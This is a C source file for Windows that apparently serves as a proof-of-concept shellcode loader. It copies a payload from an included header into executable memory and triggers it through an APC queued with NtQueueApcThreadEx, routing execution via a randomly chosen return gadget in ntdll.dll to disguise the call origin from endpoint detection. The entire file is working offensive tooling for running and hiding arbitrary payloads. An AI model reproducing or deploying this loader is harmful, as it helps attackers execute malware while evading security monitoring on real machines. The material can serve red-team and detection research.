#include <Windows.h>	
#include <stdio.h>
#include <Psapi.h>
#include <winternl.h>
#include "sc.h"

#define MAX_GADGETS 512
#define RANDOM_NUMB(min, max) (rand() % (max + 1 - min) + min)


typedef
VOID
(*PPS_APC_ROUTINE)(
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
	);


typedef
NTSTATUS
(NTAPI* _NtQueueApcThreadEx)(
	_In_ HANDLE ThreadHandle,
	_In_opt_ HANDLE UserApcReserveHandle,
	_In_ PPS_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
	);

typedef
NTSTATUS
(NTAPI* _NtTestAlert)(
	VOID
	);

_NtQueueApcThreadEx pNtQueueApcThreadEx = NULL;
_NtTestAlert pNtTestAlert = NULL;

VOID QueueAlertThreadWithGadget(HANDLE hThread, LPVOID lpGadget, PVOID lpShellcode) {

	if (NT_SUCCESS(pNtQueueApcThreadEx(hThread, NULL, (PPS_APC_ROUTINE)lpGadget, lpShellcode, NULL, NULL) == ERROR_SUCCESS))
	{
		pNtTestAlert();
	}
}

BOOL
gadget_match_valid(
	PBYTE pbAddress
)
{
	return *pbAddress != 0x58 && *(pbAddress + 1) == 0xC3;
}

BOOL InitApi(VOID) {
	HMODULE hNtdll = NULL;

	hNtdll = GetModuleHandleA("ntdll.dll");

	if (hNtdll == NULL) {
		return FALSE;
	}

	pNtQueueApcThreadEx = (_NtQueueApcThreadEx)GetProcAddress(hNtdll, "NtQueueApcThreadEx");
	if (pNtQueueApcThreadEx == NULL) {
		return FALSE;
	}

	pNtTestAlert = (_NtTestAlert)GetProcAddress(hNtdll, "NtTestAlert");
	if (pNtTestAlert == NULL) {
		return FALSE;
	}

	return TRUE;
}

LPVOID FindRandomGadget(HANDLE hProcess, LPCSTR lpcszModule) {

	HMODULE hNtdll = NULL;
	LPVOID lpaGadgets[MAX_GADGETS] = { 0 };

	hNtdll = GetModuleHandleA(lpcszModule);
	if (hNtdll == NULL) {
		return NULL;
	}

	MODULEINFO NtMi;
	if (!GetModuleInformation(hProcess, hNtdll, &NtMi, sizeof(MODULEINFO))) {
		return NULL;
	}

	PIMAGE_DOS_HEADER pDOSHdr = (PIMAGE_DOS_HEADER)NtMi.lpBaseOfDll;
	PIMAGE_NT_HEADERS pNTHdr = (PIMAGE_NT_HEADERS)((LPBYTE)NtMi.lpBaseOfDll + pDOSHdr->e_lfanew);

	RtlSecureZeroMemory(lpaGadgets, sizeof(lpaGadgets));

	DWORD dwGadgetCount = 0;
	for (WORD i = 0; i < pNTHdr->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER pSectHdr = (PIMAGE_SECTION_HEADER)((PBYTE)IMAGE_FIRST_SECTION(pNTHdr) + (IMAGE_SIZEOF_SECTION_HEADER * i));

		if (
			(pSectHdr->Characteristics & IMAGE_SCN_CNT_CODE) == IMAGE_SCN_CNT_CODE &&
			(pSectHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE
			) {

			LPBYTE lpbSectionBase = (LPBYTE)NtMi.lpBaseOfDll + pSectHdr->VirtualAddress;
			LPBYTE lpbSectionEnd = (LPBYTE)lpbSectionBase + pSectHdr->Misc.VirtualSize;

			for (PBYTE lpbCurAddr = lpbSectionBase; lpbCurAddr < (lpbSectionEnd - 1); lpbCurAddr++)
			{
				if (!gadget_match_valid(lpbCurAddr)) {
					continue;
				}

				lpaGadgets[dwGadgetCount++] = lpbCurAddr;
				if (dwGadgetCount == MAX_GADGETS)
				{
					break;
				}
			}
		}
	}

	return lpaGadgets[RANDOM_NUMB(0, dwGadgetCount)];
}

int main()
{

	LPVOID lpShellcode = NULL, lpRandomGadget = NULL;

	if (!InitApi()) {
		return -1;
	}

	printf("[+] Initialised required function pointers\n");

	lpShellcode = VirtualAlloc(NULL, (SIZE_T)stardust_x64_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpShellcode == NULL)
	{
		printf("[!] Unable to allocate memory for shellcode \n");
		return -1;
	}

	printf("[+] Allocated space for sample shellcode at 0x%0.8p, copying..\n", lpShellcode);

	RtlCopyMemory(lpShellcode, stardust_x64_bin, stardust_x64_bin_len);

	LPCSTR lpcszTarget = "ntdll.dll";

	lpRandomGadget = FindRandomGadget(GetCurrentProcess(), lpcszTarget);
	if (lpRandomGadget == NULL) {
		printf("[!] Failed to find valid gadget in Ntdll.dll\n");
		return -1;
	}

	printf("[+] Found useable gadget at location %s!0x%0.8p\n", lpcszTarget, lpRandomGadget);
	printf("[+] Calling NtQueueApcThreadEx(ApcRoutine = 0x%0.8p, SystemArgument1 = 0x%0.8p\n", lpRandomGadget, lpShellcode);

	QueueAlertThreadWithGadget(GetCurrentThread(), lpRandomGadget, lpShellcode);

	printf("[+] SUCCESS... press <ENTER> to exit\n");
	getchar();

	VirtualFree(lpShellcode, 0, MEM_RELEASE);
	return 0;
}